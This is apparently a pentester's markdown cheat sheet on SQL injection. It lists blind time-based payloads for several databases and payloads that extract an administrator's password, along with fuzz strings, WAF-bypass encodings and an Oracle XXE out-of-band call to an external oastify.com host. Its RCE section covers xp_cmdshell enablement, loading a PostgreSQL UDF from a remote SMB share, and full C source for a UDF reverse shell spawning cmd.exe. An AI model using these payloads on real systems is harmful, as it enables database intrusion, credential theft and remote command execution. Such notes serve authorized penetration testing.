[README](../README.md)
Automation Tool: [[SQLMap]]
Service Enumeration: [SQL](../../Network%20Pentesting/Services/Database%20Services/SQL.md) + [MSSQL](../../Network%20Pentesting/Services/Database%20Services/MSSQL.md)
# Detection
 - [ ] Identify where would information be retrieve from data store
 - [ ] Identify data type of input data
 - [ ] Identify possible injection operators
 - [ ] Construct potential SQL statement

## Black-box detection
**Confirming Blind SQLi**
- Oracle need to be confirmed using OOB techniques or SQLMap directly.
```sql
-- PostgreSQL
'||(select+case+when+(1=0)+then+pg_sleep(8)+else+pg_sleep(-1)+end)||'
'||(select+case+when+(1=1)+then+pg_sleep(8)+else+pg_sleep(-1)+end)||'
-- Order By
; SELECT PG_SLEEP(3);

-- MySQL & MariaDB
'+(select if(1=1, sleep(10), 'a')+'
'+(select if(1=0, sleep(10), 'a')+'
aaa' OR (SELECT 1)=1#
aaa' OR (SELECT 1)=0#
a') OR (SUBSTRING((SELECT @@version),1,1))='a'#

-- Microsoft
'+(if (1=1) waitfor delay '0:0:10')+'
'+(if (1=0) waitfor delay '0:0:10')+'

-- Oracle
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (1=0) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'
```
Blind Exfiltration
```sql
-- Enumerate password length

'||(select+case+when+(username='administrator'+and+LENGTH(password)>20)+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'

-- Password
'||(select+case+when+(username='administrator'+and+SUBSTRING(password,1,1)='a')+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'

'||(select+case+when+(username='administrator'+and+SUBSTRING(password,3,1)='z')+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'
```
Detection Fuzz
```python
# MySQL & MariaDB
id # column name 
''
""
'+'
"+"
' '
" "
'%20'
"%20"
'%2b'
"%2b"
` # column name injection
``
)
(
()
% # Verify that database is being called (% retrieve all)
\
\\
'\
'\'
&
'&'
"&"
/*
#
;
%3b
//
foo'+'bar
CONCAT('foo','bar')
'-sleep(3)-'
'+sleep(3)+'
"-sleep(3)-"
"+sleep(3)+"
2#
2-- -
2--
(2+1) # Integer Data
(2%2b1)
(2-1)
2+1
2%2b1
2-1
67-ACII('A')
51-ASCII(1)

# SQLite


# PostgreSQL
'||'
"||"
'foo'||'bar'
foo'||'bar
'||pg_sleep(3)||'
"||pg_sleep(3)||"

# Oracle
'||'
"||"
'foo'||'bar'
'||(select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+rdswv+SYSTEM+"http%3a//if1j93mn00dej9djr7oducx9x03rrhf6.oastify.com">%25rdswv%3b]>'),'/l')+from+dual)||'


# MSSQL
'+'
"+"
WAITFOR DELAY '0:00:03'

```
---
## Whitebox 
MySQL log: `/etc/mysql/my.cnf`


- [PHP SQLi](../Whitebox%20Testing/SQLi/PHP%20SQLi.md)
- 

# WAF/Filter Bypass
- [ ] WAFW00F reveals WAF
```sql
SeLeCt
SELECT
sElEcT
Select
select
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54 
%2553%2545%254c%2545%2543%2554
SELECT/**/username,password/**/FROM/**/users
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users # MySQL

/* MySQL */
SELECT 0x6a6f726765637466 #SELECT 'jorgectf'


/* PostgreSQL */
print('||'.join("CHR("+str(ord(i))+")" for i in "jorgectf"))
SELECT CHR(106)||CHR(111)||CHR(114)||CHR(103)||CHR(101)||CHR(99)||CHR(116)||CHR(102) #SELECT jorgectf
SELECT 'pentest';
SELECT $$pentest$$;
SELECT $TAG$pentest$TAG$;
SELECT U&"\006a\006f\0072\0067\0065\0063\0074\0066" #SELECT jorgectf
SELECT U&'\006a\006f\0072\0067\0065\0063\0074\0066' #SELECT 'jorgectf'
U&'\006a\006f\0072\0067\0065\0063\0074\0066'() #jorgectf()
```

# RCE
## MySQL 
Read Files (require FILE_PRIV)
```sql
select load_file('/etc/passwd')
```
## MSSQL 
```sql
master..xp_cmdshell 'ipconfig > foo.txt'
exec xp_cmdshell 'dir'
```
- Re-enabling xp_cmdshell (sp_configure)
```sql
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```
## PostgreSQL
`COPY` function
- Write & Read files but cannot do binary files
```
```
 `User Defined Function (UDF)` RCE
- Create custom UDF called `test()`
```sql
CREATE OR REPLACE FUNCTION test(text) RETURNS void as 'FILENAME', 'test' LANGUAGE 'C' STRICT;

CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void as 'C:\\pentest.dll', 'pentest' LANGUAGE 'C' STRICT;
SELECT test('calc.exe', 3);

-- Remote loading SMB server
CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void as '\\192.168.40.12\pentest\pentest.dll', 'pentest' LANGUAGE 'C' STRICT;
```
- If failed, restart service and delete the loaded function because function is loaded in memory
```sql
DROP FUNCTION test(text, integer)
```
UDF reverse shell
```C
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

	/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

	/* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	/* FIX THIS */
	hax.sin_port = XXXXXXXXXXXXX
	/* FIX THIS TOO*/
	hax.sin_addr.s_addr = XXXXXXXXXXXXXXX

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();
}
```
Binary Files through Large Objects
```sql
select lo_import('C:\\Windows\\win.ini', <LOID_VALUE>);
\lo_list
```